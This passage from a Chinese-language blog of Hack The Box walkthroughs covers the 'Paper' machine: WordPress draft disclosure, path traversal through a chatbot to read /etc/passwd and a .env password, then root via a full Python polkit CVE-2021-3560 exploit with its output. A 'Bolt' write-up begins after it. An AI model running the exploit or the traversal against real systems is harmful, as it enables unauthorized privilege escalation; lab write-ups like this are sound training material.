X-Backend-Server: office.paper\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] WordPress readme found: http://office.paper/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).\n | Found By: Rss Generator (Passive Detection)\n |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>\n |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>\n\n[+] WordPress theme in use: construction-techup\n | Location: http://office.paper/wp-content/themes/construction-techup/\n | Last Updated: 2021-07-17T00:00:00.000Z\n | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt\n | [!] The version is out of date, the latest version is 1.4\n | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1\n | Style Name: Construction Techup\n | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...\n | Author: wptexture\n | Author URI: https://testerwp.com/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:06 <=====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Fri Feb 18 22:59:23 2022\n[+] Requests Done: 143\n[+] Cached Requests: 31\n[+] Data Sent: 35.766 KB\n[+] Data Received: 91.745 KB\n[+] Memory used: 230.363 MB\n[+] Elapsed time: 00:00:11\n```\n这里可以看到版本号是Wordpress 5.2.3\n\n去Google一下是否有Exploit\n\n> [https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)\n\n这里找到一个未经身份验证查看他人私人帖子的漏洞，去使用看看\n\n```bash\nhttp://office.paper/?static=1&order=asc\n```\n直接使用会提示404，尝试把后面&order=asc删除试试\n\n```bash\nhttp://office.paper/?static=1\n```\n![](Hackthebox-Paper/1d61a788-f447-43c4-81f1-d8fad3fb4579.png)\n\n成功读取到一篇帖子，查看一下其中内容\n\n```Plain Text\ntest\n\nMicheal please remove the secret from drafts for gods sake!\n\nHello employees of Blunder Tiffin,\n\nDue to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.\n\nSo, I kindly request you all to take your discussions from the public blog to a more private chat system.\n\n-Nick\n\n# Warning for Michael\n\nMichael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick\n\nThreat Level Midnight\n\nA MOTION PICTURE SCREENPLAY,\nWRITTEN AND DIRECTED BY\nMICHAEL SCOTT\n\n[INT:DAY]\n\nInside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….\n\n# Secret Registration URL of new Employee chat system\n\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n\n# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.\n\n# Also, stop looking at my drafts. Jeez!\n```\n其中提到了一个新员工聊天系统的秘密网址\n\n```bash\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n```\n把新网址添加到hosts里\n\n```bash\necho 10.10.11.143 chat.office.paper\n```\n![](Hackthebox-Paper/c63d28a6-6d9a-49dd-a6fd-0c00297ea34f.png)\n\n这里可以注册一个新用户\n\n我们去注册一个吧\n\n![](Hackthebox-Paper/63577bc9-df3a-445a-baf0-00cb201e0802.png)\n\n注册后成功登录进来，去看看有什么内容没有\n\n![](Hackthebox-Paper/078fe563-78d3-4fef-a815-71502a267451.png)\n\n稍等一会然后看到了一个新的内容，去看看\n\n![](Hackthebox-Paper/25e41e7f-1d57-41b1-a906-f25da6196bbe.png)\n\n这里提到有人在该频道中添加了一个新的机器人，只需要输入recyclops help机器人就会告诉你可以做什么\n\n```Plain Text\nHello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.\nMost frequently asked questions include:\n- What time is it?\n- What new files are in your sales directory?\n- Why did the salesman crossed the road?\n- What's the content of file x in your sales directory? etc.\nPlease note that I am a beta version and I still have some bugs to be fixed.\nHow to use me ? :\n1. Small Talk:\nYou can ask me how dwight's weekend was, or did he watched the game last night etc.\neg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?\n2. Joke:\nYou can ask me Why the salesman crossed the road.\neg: 'recyclops why did the salesman crossed the road?'\n<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>\nFor security reasons, the access is limited to the Sales folder.\n3. Files:\neg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'\n4. List:\nYou can ask me to list the files\n5. Time:\nYou can ask me to what the time is\neg: 'recyclops what time is it?' or just 'recyclops time'\n```\n然后机器人给出了自己的用法\n\n## 漏洞利用\n目前可知的信息\n\n1. 我们有了一个可以互动的机器人 recyclops\n2. 机器人可以帮我们获得文件\n3. 我们无法在频道内发言\n\nOK，到这里思路就很清晰了，我们去找机器人私聊\n\n![](Hackthebox-Paper/1d474983-597c-4e3d-957a-59035a2a19e7.png)\n\n这里要求他读取test.txt文件\n\n回复文件/home/dwight/sales/test.txt文件不存在，尝试一下是否可以路径穿越\n\n![](Hackthebox-Paper/09696c50-4498-48a5-b31a-b4e721ce4bac.png)\n\n这边构造了一下路径，成功获得/etc/passwd文件\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nsystemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\npolkitd:x:998:996:User for polkitd:/:/sbin/nologin\ngeoclue:x:997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin\nrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\nqemu:x:107:107:qemu user:/:/sbin/nologin\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\ncockpit-ws:x:996:993:User for cockpit-ws:/:/sbin/nologin\npulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin\nusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin\nunbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\ngluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin\nchrony:x:993:987::/var/lib/chrony:/sbin/nologin\nlibstoragemgmt:x:992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\nsaslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin\ndnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\nradvd:x:75:75:radvd user:/:/sbin/nologin\nclevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin\npegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin\nsssd:x:983:981:User for sssd:/:/sbin/nologin\ncolord:x:982:980:User for colord:/var/lib/colord:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsetroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin\npipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin\ngdm:x:42:42::/var/lib/gdm:/sbin/nologin\ngnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin\ninsights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\navahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin\nnginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin\nmongod:x:976:974:mongod:/var/lib/mongo:/bin/false\nrocketchat:x:1001:1001::/home/rocketchat:/bin/bash\ndwight:x:1004:1004::/home/dwight:/bin/bash\n```\n### User\n我们查看一下当前文件\n\n```bash\nrecyclops list\n\ntotal 0\ndrwxr-xr-x  4 dwight dwight  32 Jul  3  2021 .\ndrwx------ 11 dwight dwight 334 Feb 18 20:41 ..\ndrwxr-xr-x  2 dwight dwight  27 Sep 15 13:03 sale\ndrwxr-xr-x  2 dwight dwight  27 Jul  3  2021 sale_2\n```\n 没什么可看的，继续查看上级目录\n\n```bash\nrecyclops list ../\n\ntotal 788\ndrwx------  11 dwight dwight    334 Feb 18 20:41 .\ndrwxr-xr-x.  3 root   root       20 Feb 18 23:14 ..\nlrwxrwxrwx   1 dwight dwight      9 Jul  3  2021 .bash_history -> /dev/null\n-rw-r--r--   1 dwight dwight     18 May 10  2019 .bash_logout\n-rw-r--r--   1 dwight dwight    141 May 10  2019 .bash_profile\n-rw-r--r--   1 dwight dwight    358 Jul  3  2021 .bashrc\n-rwxr-xr-x   1 dwight dwight   1174 Sep 16 06:58 bot_restart.sh\ndrwx------   5 dwight dwight     56 Jul  3  2021 .config\n-rw-------   1 dwight dwight     16 Jul  3  2021 .esd_auth\ndrwx------   3 dwight dwight     69 Feb 18 22:58 .gnupg\ndrwx------   8 dwight dwight   4096 Sep 16 07:57 hubot\n-rw-rw-r--   1 dwight dwight     18 Sep 16 07:24 .hubot_history\n-rwxr-xr-x   1 dwight dwight 765818 Feb 18 20:37 linpeas.sh\ndrwx------   3 dwight dwight     19 Jul  3  2021 .local\ndrwxr-xr-x   4 dwight dwight     39 Jul  3  2021 .mozilla\ndrwxrwxr-x   5 dwight dwight     83 Jul  3  2021 .npm\ndrwxr-xr-x   4 dwight dwight     32 Jul  3  2021 sales\ndrwx------   2 dwight dwight      6 Sep 16 08:56 .ssh\n-rw-rw-r--   1 dwight dwight   2434 Feb 18 20:41 testfile.py\n-r--------   1 dwight dwight     33 Feb 18 19:01 user.txt\ndrwxr-xr-x   2 dwight dwight     24 Sep 16 07:09 .vim\n-rw-------   1 dwight dwight    818 Feb 18 20:41 .viminfo\n```\n在这个目录中，有一个hubot文件我很好奇，进去看看\n\n```bash\nrecyclops list ../hubot\n\ntotal 1908\ndrwx------   8 dwight dwight    4096 Sep 16 07:57 .\ndrwx------  11 dwight dwight     334 Feb 18 20:41 ..\n-rw-r--r--   1 dwight dwight       0 Jul  3  2021 \\\nsrwxr-xr-x   1 dwight dwight       0 Jul  3  2021 127.0.0.1:8000\nsrwxrwxr-x   1 dwight dwight       0 Jul  3  2021 127.0.0.1:8080\ndrwx--x--x   2 dwight dwight      36 Sep 16 07:34 bin\n-rw-r--r--   1 dwight dwight     258 Sep 16 07:57 .env\n-rwxr-xr-x   1 dwight dwight       2 Jul  3  2021 external-scripts.json\ndrwx------   8 dwight dwight     163 Jul  3  2021 .git\n-rw-r--r--   1 dwight dwight     917 Jul  3  2021 .gitignore\n-rw-r--r--   1 dwight dwight 1803113 Feb 18 23:41 .hubot.log\n-rwxr-xr-x   1 dwight dwight    1068 Jul  3  2021 LICENSE\ndrwxr-xr-x  89 dwight dwight    4096 Jul  3  2021 node_modules\ndrwx--x--x 115 dwight dwight    4096 Jul  3  2021 node_modules_bak\n-rwxr-xr-x   1 dwight dwight    1062 Sep 16 07:34 package.json\n-rwxr-xr-x   1 dwight dwight     972 Sep 16 07:26 package.json.bak\n-rwxr-xr-x   1 dwight dwight   30382 Jul  3  2021 package-lock.json\n-rwxr-xr-x   1 dwight dwight      14 Jul  3  2021 Procfile\n-rwxr-xr-x   1 dwight dwight    5044 Jul  3  2021 README.md\ndrwx--x--x   2 dwight dwight     193 Jan 13 10:56 scripts\n-rwxr-xr-x   1 dwight dwight     100 Jul  3  2021 start_bot.sh\ndrwx------   2 dwight dwight      25 Jul  3  2021 .vscode\n-rwxr-xr-x   1 dwight dwight   29951 Jul  3  2021 yarn.lock\n```\n在hubot目录中，有一个.env文件，咱们查看一下这个文件\n\n```bash\nrecyclops file ../hubot/.env\n\nexport ROCKETCHAT_URL='http://127.0.0.1:48320'\nexport ROCKETCHAT_USER=recyclops\nexport ROCKETCHAT_PASSWORD=Queenofblad3s!23\nexport ROCKETCHAT_USESSL=false\nexport RESPOND_TO_DM=true\nexport RESPOND_TO_EDITED=true\nexport PORT=8000\nexport BIND_ADDRESS=127.0.0.1\n```\n这里得到了一个密码\n\n```Plain Text\nQueenofblad3s!23\n```\n去使用ssh登录试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh dwight@10.10.11.143                  \nThe authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.\nECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.143' (ECDSA) to the list of known hosts.\ndwight@10.10.11.143's password: \nActivate the web console with: systemctl enable --now cockpit.socket\n\nLast login: Fri Feb 18 23:58:30 2022 from 10.10.14.56\n[dwight@paper ~]$ whoami&&id\ndwight\nuid=1004(dwight) gid=1004(dwight) groups=1004(dwight)\n```\n成功获得user权限\n\n```bash\n[dwight@paper ~]$ ls\nbot_restart.sh  hubot  linpeas.sh  sales  testfile.py  user.txt\n[dwight@paper ~]$ cat user.txt \n8247362b1baac2f85fd97507b5104341\n```\n成功获得user权限的flag文件\n\n## 权限提升\n### Root\n这里使用CVE-2021-3560进行提权\n\n```python\nimport os\nimport sys\nimport time\nimport subprocess\nimport random\nimport pwd\n\nprint (\"**************\")\nprint(\"Exploit: Privilege escalation with polkit - CVE-2021-3560\")\nprint(\"Exploit code written by Ahmad Almorabea @almorabea\")\nprint(\"Original exploit author: Kevin Backhouse \")\nprint(\"For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\")\nprint (\"**************\")\nprint(\"[+] Starting the Exploit \")\ntime.sleep(3)\n\ncheck = True\ncounter = 0\nwhile check:\n        counter = counter +1\n        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:ahmed','string:\"Ahmad Almorabea','int32:1'])\n        try:\n                #print('1 - Running in process', process.pid)\n                Random = random.uniform(0.006,0.009)\n                process.wait(timeout=Random)\n                process.kill()\n        except subprocess.TimeoutExpired:\n                #print('Timed out - killing', process.pid)\n                process.kill()\n\n        user = subprocess.run(['id', 'ahmed'], stdout=subprocess.PIPE).stdout.decode('utf-8')\n        if user.find(\"uid\") != -1:\n                print(\"[+] User Created with the name of ahmed\")\n                print(\"[+] Timed out at: \"+str(Random))\n                check =False\n                break\n        if counter > 2000:\n                print(\"[-] Couldn't add the user, try again it may work\")\n                sys.exit(0)\n\nfor i in range(200):\n        #print(i)\n        uid = \"/org/freedesktop/Accounts/User\"+str(pwd.getpwnam('ahmed').pw_uid)\n\n        #In case you need to put a password un-comment the code below and put your password after string:yourpassword'\n        password = \"string:\"\n        #res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')\n        #password = f\"string:{res.rstrip()}\"\n\n        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])\n        try:\n                #print('1 - Running in process', process.pid)\n                Random = random.uniform(0.006,0.009)\n                process.wait(timeout=Random)\n                process.kill()\n        except subprocess.TimeoutExpired:\n                #print('Timed out - killing', process.pid)\n                process.kill()\n\nprint(\"[+] Timed out at: \" + str(Random))\nprint(\"[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root \")\n\np = subprocess.call(\"(su ahmed -c 'sudo su')\", shell=True)\n```\n```bash\n[dwight@paper ~]$ python3 CVE-2021-3560.py \n**************\nExploit: Privilege escalation with polkit - CVE-2021-3560\nExploit code written by Ahmad Almorabea @almorabea\nOriginal exploit author: Kevin Backhouse \nFor more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\n**************\n[+] Starting the Exploit \nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\n[+] User Created with the name of ahmed\n[+] Timed out at: 0.008836088833898081\n...\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\n[+] Timed out at: 0.008945334127711566\n[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root\nPassword: \nsu: Authentication failure\n```\n出现这种就是执行失败，反复多次执行，出现下列提示就是成功了\n\n```bash\n[dwight@paper ~]$ python3 CVE-2021-3560.py \n**************\nExploit: Privilege escalation with polkit - CVE-2021-3560\nExploit code written by Ahmad Almorabea @almorabea\nOriginal exploit author: Kevin Backhouse \nFor more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\n**************\n[+] Starting the Exploit \n[+] User Created with the name of ahmed\n[+] Timed out at: 0.008008275505860037\n[+] Timed out at: 0.00782768600159978\n[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root \nbash: cannot set terminal process group (118347): Inappropriate ioctl for device\nbash: no job control in this shell\n```\n```bash\n[root@paper dwight]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得root权限\n\n```bash\n[root@paper dwight]# cd /root\n[root@paper ~]# ls\nanaconda-ks.cfg  initial-setup-ks.cfg  root.txt\n[root@paper ~]# cat root.txt \nfb28d8a0b971692ac9726bf448af8497\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Bolt - Hackthebox","url":"/2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/","content":"\n# Hackthebox - Bolt\n## 靶场信息\n![](Hackthebox-Bolt/72b0f2b4-8266-4be1-bd28-66ac49764a2d.png)\n\n## 靶场类型\n![](Hackthebox-Bolt/c7905f20-ab98-42e1-897d-40bfd0d796b5.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 20:07 EST\nWarning: 10.10.11.114 giving up on port because retransmission cap hit (10).\nNmap scan report for bogon (10.10.11.114)\nHost is up (0.26s latency).\nNot shown: 65527 closed ports\nPORT      STATE    SERVICE  VERSION\n22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)\n|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)\n|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)\n80/tcp    open     http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title:     Starter Website -  About \n443/tcp   open     ssl/http nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU\n| Not valid before: 2021-02-24T19:11:23\n|_Not valid after:  2022-02-24T19:11:23\n15062/tcp filtered unknown\n17825/tcp filtered unknown\n37303/tcp filtered unknown\n40042/tcp filtered unknown\n63830/tcp filtered unknown\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=33320%PV=Y%DS=2%DC=T%G=Y%TM=61D4F026\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT       ADDRESS\n1   266.28 ms bogon (10.10.14.1)\n2   266.96 ms bogon (10.10.11.114)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 237.89 seconds\n```\n首先去看看80端口的http服务\n\n![](Hackthebox-Bolt/de2e9987-4bad-4b45-8a95-830878efd108.png)\n\n添加到hosts\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# echo 10.10.11.114 bolt.htb >> /etc/hosts\n```\n这里有个登录按钮，进去看看\n\n![](Hackthebox-Bolt/9f180698-27ff-4f89-b98d-cc553b8ba90d.png)\n\n尝试下有没有弱口令\n\n![](Hackthebox-Bolt/b3557e23-74c1-4f31-9dfe-4a80680d5f82.png)\n\n使用admin账户进行登录，提示的是密码错误，那是不是可以爆破账号呢？用admin1测试一下\n\n![](Hackthebox-Bolt/31e93a3e-e33e-4a33-9ba9-dbc8709f3bf2.png)\n\n是的，提示完全不一样，目前可以确定admin账号存在了\n\n![](Hackthebox-Bolt/dd4f952b-93e5-4790-bca0-91cb36ca119e.png)\n\n尝试注册账号却提示500，去扫个目录试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.114/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.114/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\ncontact                 [Status: 200, Size: 26293, Words: 10060, Lines: 468]\nlogout                  [Status: 302, Size: 209, Words: 22, Lines: 4]\nlogin                   [Status: 200, Size: 9287, Words: 2135, Lines: 173]\nregister                [Status: 200, Size: 11038, Words: 3053, Lines: 199]\ndownload                [Status: 200, Size: 18570, Words: 5374, Lines: 346]\nservices                [Status: 200, Size: 22443, Words: 7170, Lines: 405]\npricing                 [Status: 200, Size: 31731, Words: 11055, Lines: 549]\nsign-up                 [Status: 200, Size: 11038, Words: 3053, Lines: 199]\nsign-in                 [Status: 200, Size: 9287, Words: 2135, Lines: 173]\n                        [Status: 200, Size: 30347, Words: 10870, Lines: 505]\ncheck-email             [Status: 200, Size: 7331, Words: 1224, Lines: 147]\n:: Progress: [20116/20116] :: Job [1/1] :: 61 req/sec :: Duration: [0:03:19] :: Errors: 0 ::\n```\n都测试了一遍，暂时没什么思路，不过sign-up和sign-in页面会提示405，感觉是被什么东西过滤了，先放着不管，看看有没有其他思路吧\n\n![](Hackthebox-Bolt/b1e5ceb1-e935-4804-8058-d3c7310f12ee.png)\n\n在/download目录下，咱们可以下载一个压缩文件image.tar\n\n把它下载下来看看\n\n```bash\n┌──(root💀kali)-[~/Desktop/image]\n└─# ls -la\n总用量 64\ndrwxr-xr-x 13 root root 4096  1月  6 01:03 .\ndrwxr-xr-x  4 root root 4096  1月  6 01:03 ..\ndrwxr-xr-x  2 root root 4096  3月  5  2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950\ndrwxr-xr-x  2 root root 4096  3月  5  2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c\ndrwxr-xr-x  2 root root 4096  3月  5  2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa\ndrwxr-xr-x  2 root root 4096  3月  5  2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab\ndrwxr-xr-x  2 root root 4096  3月  5  2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162\ndrwxr-xr-x  2 root root 4096  3月  5  2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b\ndrwxr-xr-x  2 root root 4096  3月  5  2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad\ndrwxr-xr-x  2 root root 4096  3月  5  2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf\n-rw-r--r--  1 root root 3797  3月  5  2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json\ndrwxr-xr-x  2 root root 4096  3月  5  2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77\ndrwxr-xr-x  3 root root 4096  1月  6 01:03 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2\ndrwxr-xr-x  2 root root 4096  3月  5  2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26\n-rw-r--r--  1 root root 1002 12月 31  1969 manifest.json\n-rw-r--r--  1 root root  119 12月 31  1969 repositories\n```\n下载下来解压后，会有很多文件，在其中一个文件夹a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2中的layer.tar里，找到了一个文件db.sqlite3\n\n```bash\n┌──(root💀kali)-[~/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer]\n└─# ls -la\n总用量 32\ndrwxr-xr-x 4 root root  4096  1月  6 01:03 .\ndrwxr-xr-x 3 root root  4096  1月  6 01:03 ..\n-rw-r--r-- 1 root root 16384  3月  5  2021 db.sqlite3\ndrwx------ 2 root root  4096  3月  5  2021 root\ndrwxrwxrwt 2 root root  4096  3月  5  2021 tmp\n```\n使用sqlite3查看一下数据库\n\n```bash\n┌──(root💀kali)-[~/Desktop/image]\n└─# sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3                                                                                                                   1 ⚙\nSQLite version 3.34.1 2021-01-20 14:10:07\nEnter \".help\" for usage hints.\nsqlite> .table\nUser\nsqlite> select * from 